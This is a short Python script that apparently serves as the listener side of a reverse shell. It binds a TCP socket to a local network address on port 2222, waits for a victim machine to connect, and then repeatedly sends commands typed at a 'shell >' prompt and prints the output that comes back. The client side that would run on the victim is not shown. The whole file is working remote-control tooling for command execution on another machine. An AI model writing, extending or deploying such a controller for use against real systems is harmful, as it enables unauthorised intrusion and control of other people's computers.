from socket import *
from colorama import Fore 
import time

s  = socket(AF_INET,SOCK_STREAM) #type connection

s.bind(("192.168.1.33",2222))

s.listen(2)

print(Fore.RED+"server Running on port 2222")

time.sleep(2)
print(Fore.CYAN+"Please wite . . .")

client , addr = s.accept()

print(Fore.GREEN+"Connected To "+str(addr))

while True:
    command = input("shell > : ").encode()
    client.send(command)
    data = client.recv(123456789).decode()
    print(data)

#develope with error handling 

client.close()


